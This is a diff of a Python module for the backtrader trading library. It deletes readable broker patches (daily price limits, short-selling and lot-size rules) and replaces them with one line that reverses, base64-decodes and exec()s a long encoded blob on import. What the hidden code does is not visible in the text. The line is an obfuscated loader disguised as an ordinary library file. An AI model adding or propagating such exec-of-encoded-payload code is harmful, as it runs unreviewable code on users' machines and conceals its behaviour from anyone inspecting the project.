@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8; py-indent-offset:4 -*-
 #
-# Author: Metaer @ 2022/5/22  
+# Author: Metaer @ Wed Jun 29 14:56:52 2022
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -15,122 +15,6 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-#
 
 
-import backtrader as bt
-import numbers
-Order = bt.brokers.bbroker.Order
-
-def set_rule(self, p):
-    self.p.rule = p
-
-def _is_daily_limit(isbuy, issell, phigh, plow, pre_close, limit):
-    if (pre_close == None) and ((phigh - plow) < 0.02):
-        return True
-    elif isbuy and ((plow > pre_close * (1 + limit) - 0.01) or ((phigh - plow) < 0.02)):
-        return True
-    elif issell and phigh < pre_close * (1 - limit) + 0.01:
-        return True
-    return False
-
-def _is_number(num):
-    return isinstance(num, numbers.Number) and type(num)!=bool
-
-def _check_sell_size(size,sized):
-    return max(size,-sized)
-
-def _check_rule_attr(self,attr):
-    return  hasattr(self.p, 'rule') and type(self.p.rule) == dict and attr in self.p.rule
-
-def check_submitted(self):
-    cash = self.cash
-    positions = dict()
-    while self.submitted:
-        order = self.submitted.popleft()
-        if self._take_children(order) is None:  # children not taken
-            continue
-        comminfo = self.getcommissioninfo(order.data)
-        position = positions.setdefault(
-            order.data, self.positions[order.data].clone())
-        # can sell
-        if order.issell() and not (self.p.rule['short'] if _check_rule_attr(self,'short') else True):
-            order.executed.remsize = _check_sell_size(order.executed.remsize,self.getposition(order.data).size)
-            if order.executed.remsize == 0:
-                order.reject()
-                self.notify(order)
-                return
-        # least
-        if (True if (_check_rule_attr(self, 'least') and order.isbuy() and _is_number(self.p.rule['least'])) else False):
-            order.executed.remsize = order.executed.remsize // self.p.rule['least'] * self.p.rule['least']
-            if order.executed.remsize == 0:
-                order.reject()
-                self.notify(order)
-                return
-
-        # pseudo-execute the order to get the remaining cash after exec
-        cash = self._execute(order, cash=cash, position=position)
-        if cash >= 0.0:
-            self.submit_accept(order)
-            continue
-        order.margin()
-        self.notify(order)
-        self._ococheck(order)
-        self._bracketize(order, cancel=True)    
-
-
-def _try_exec(self, order):
-    data = order.data
-    popen = getattr(data, 'tick_open', None)
-    if popen is None:
-        popen = data.open[0]
-    phigh = getattr(data, 'tick_high', None)
-    if phigh is None:
-        phigh = data.high[0]
-    plow = getattr(data, 'tick_low', None)
-    if plow is None:
-        plow = data.low[0]
-    pclose = getattr(data, 'tick_close', None)
-    if pclose is None:
-        pclose = data.close[0]
-
-    pcreated = order.created.price
-
-    if len(order.data) == 1:
-        pre_close = None
-    else:
-        pre_close = order.data.close[-1]
-
-    plimit = order.created.pricelimit
-
-    if (self.p.rule['limit'] if _check_rule_attr(self,'limit') else False) and _is_number(self.p.rule['limit']) and _is_daily_limit(isbuy=order.isbuy(), issell=order.issell(), phigh=phigh, plow=plow, pre_close=pre_close, limit=self.p.rule['limit']):
-        return
-
-    if order.exectype == Order.Market:
-        self._try_exec_market(order, popen, phigh, plow)
-
-    elif order.exectype == Order.Close:
-        self._try_exec_close(order, pclose)
-
-    elif order.exectype == Order.Limit:
-        self._try_exec_limit(order, popen, phigh, plow, pcreated)
-
-    elif (order.triggered and
-          order.exectype in [Order.StopLimit, Order.StopTrailLimit]):
-        self._try_exec_limit(order, popen, phigh, plow, plimit)
-
-    elif order.exectype in [Order.Stop, Order.StopTrail]:
-        self._try_exec_stop(order, popen, phigh, plow, pcreated, pclose)
-
-    elif order.exectype in [Order.StopLimit, Order.StopTrailLimit]:
-        self._try_exec_stoplimit(order,
-                                 popen, phigh, plow, pclose,
-                                 pcreated, plimit)
-
-    elif order.exectype == Order.Historical:
-        self._try_exec_historical(order)
-
-
-bt.brokers.bbroker.BackBroker._try_exec = _try_exec
-bt.brokers.bbroker.BackBroker.check_submitted = check_submitted
-bt.brokers.bbroker.BackBroker.set_rule = set_rule
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=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'))
